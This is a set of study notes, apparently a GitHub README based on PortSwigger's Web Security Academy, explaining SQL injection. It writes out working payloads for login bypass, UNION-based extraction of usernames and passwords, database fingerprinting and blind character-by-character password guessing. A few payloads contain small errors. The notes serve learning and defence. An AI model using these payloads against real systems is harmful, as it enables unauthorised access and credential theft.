- - -

# Summary

- [SQL injection](https://github.com/Sleleu/Web-Security-Academy/tree/main/SQL%20Injection#sql-injection)
- [Retrieving hidden data](https://github.com/Sleleu/Web-Security-Academy/tree/main/SQL%20Injection#retrieving-hidden-data)
- [Subverting application logic](https://github.com/Sleleu/Web-Security-Academy/tree/main/SQL%20Injection#subverting-application-logic)
- [Retrieving data from other databases tables (UNION ATTACKS)](https://github.com/Sleleu/Web-Security-Academy/tree/main/SQL%20Injection#retrieving-data-from-other-databases-tables)
- [Examining the database before an SQL injection](https://github.com/Sleleu/Web-Security-Academy/tree/main/SQL%20Injection#examining-the-database-before-an-sql-injection)
- [Blind SQL injection vulnerabilities](https://github.com/Sleleu/Web-Security-Academy/tree/main/SQL%20Injection#blind-sql-injection-vulnerabilities)

- - -

# SQL Injection

SQL injection (SQLi) allow an attacker to **interfere with the queries that an application makes to its database.**
There are a wide variety of SQLi :

- **Retrieving hidden data :** using an SQLi to return additional results
- **Subverting app logic :** change a query to interfere with the app logic
- **UNION attacks :** retrieving data from other database tables
- **Examining the database :** extract informations about version and structure of the databases
- **Blind SQL injection :** where the results of a query you control are not returned in the app responses

## Retrieving hidden data

The SQL query for : https//website.com:products?category=Gifts 
is : 

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`


For an insecure website, an attacker can construct an attack to include inreleased products :

https//website.com:products?category=Gifts`'--`

The following SQL query is : `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

The double dash sequence is a commment indicator that mean the rest of the query is interpreted as a comment.

An attacker can cause the application to display all the products in any category, including categories that they don't know about with a boolean :

https//website.com:products?category=Gifts`'+OR+1=1--`
This query return all item from the Gifts category, or 1 is equal to 1, since is alsways true, the query return all items.

## Subverting application logic

An attacker can log in as any user without a password simply by using the comment sequence `--` to remove the password check from the WHERE clause. For example :

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

## Retrieving data from other databases tables

This is done using the SQLi UNION attack.

The UNION keyword can be used to retrieve data from other databases, it permit to execute one or more additional SELECT queries and append the results to the original query.

Example : `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

This query return a result set with 2 columns, containing values from a, b in _table1_, and c, d in _table2_.

2 conditions for an UNION query :
- **the queries must return the same number of columns**
- **data types in each column must be compatbile between the individual queries**

so we need to find how many columns are being returned from the original query + which columns are compatible

### Determining the number of columns required in an SQLi UNION attack

**1 :** injecting a serie of ORDER BY clauses and incrementing the specified column index :

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc...
```

**2 :** submitting a series of UNION SELECT payloads :

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
etc...
```

if the number of nulls does not match the number of columns, the database can return an error.
**Why using NULL ?** NULL is convertible to every commonly used data type, so using NULL maximizes the canche that the payload succeed when the column count is correct.

On Oracle, every SELECT query must use the FROM keyword and specify a valid table. A built-in table on Oracle called _dual_ can be used :

```
' UNION SELECT NULL FROM DUAL--
```

On MySQL, the `--` sequence must be followed by a space. Alternatively, a `#` can be used to identify a comment

### Finding columns with a useful data type in an SQLi UNION attack

Generally, the interesting data will be in string form.
Having already determined the number of columns, you can test each column by placing a string value, for example if the query return 3 columns :

```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

If an error does not occur, then the column is suitable for retrieving string data.

### Using an SQLi UNION attack to retrieve interesting data

With the good **number of columns** and found **which columns can hold string data**, you are in position to retrieve interesting data

Suppose :
- The original query return 2 columns, both compatibles with string data
- Injection point is a quoted string within the WHERE clause
- The database contains a table _users_ with the coluons _username_ and _password_

In this situation, you can retrieve the contents of the _users_ table by submitting the input :

`UNION SELECT username, password, FROM users--`

### Retrieving multiple values within a single column

Even if the query only returns 1 column, you can retrieve multiple values together within this single column by concatening the
values together.
In Oracle for example, you could submit this input :

```
'UNION SELECT username || '~' || password FROM users--
```

The double-pipe sequence `||` is a string concatenation operator on Oracle. The injected query concatenates the values of
username + password separated with a " ~ ".


# Examining the database before an SQL injection

It is often necessary to gather some informations about :
- type and version of the database
- which tables and columns it contains

## Querying the database type and version

There are different ways of querying to obtain the type and version of the database :

| Database type    |          Query          |
|------------------|-------------------------|
| Microsoft, MySQL | SELECT @@version        |
|      Oracle      | SELECT * FROM v$version |
|    PostgreSQL    | SELECT version()        |

## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema which
provide information about the database.

To list the tables :

```
SELECT * FROM information_schema.tables
```

To list columns in individual tables

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

For Oracle, you can obtain the same information with different queries.

To list tables on Oracle :

```
SELECT * FROM all_tables
```

To list columns on Oracle :

```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

# Blind SQL injection vulnerabilities

Sometimes, an application is vulnerable to SQLi, but its HTTP responses do not contain the results of the SQL query or the details of databases errors.

With blind SQLi, UNION attacks aren't effective because we can't see the results.

## Exploiting blind SQLi by triggering conditional responses

Consider an app that uses tracking cookies, requests to the app include a cookie header like this :

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

The app determine if this is a know user like this :

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Even if the results from the query aren't returned to the user, the app does behave differently depending on whether the query returns any data. For example, if a 'Welcome back' message is displayed, it's enough to exploit the blind SQLi.

Suppose you have two boolean requests containing the following tracking id :
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```
These true and false booleans allows us to determine the answer to any single injected condition.

In example, suppose there is a table 'Users' with the columns, 'Username' and 'Password', and a user 'Administrator'. We can have his password by **sending a series of inputs to test the password one character at a time**.

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

If this input return a Welcome back message, it mean the first char of the password is greater than m

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

If we have a welcome back message, it mean the first letter is 's'.

- - -

### Usefull links

- [SQL Injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQL Injection](https://portswigger.net/web-security/sql-injection)
- [Columns of the Information Schema](https://www.postgresql.org/docs/12/infoschema-columns.html)

- - -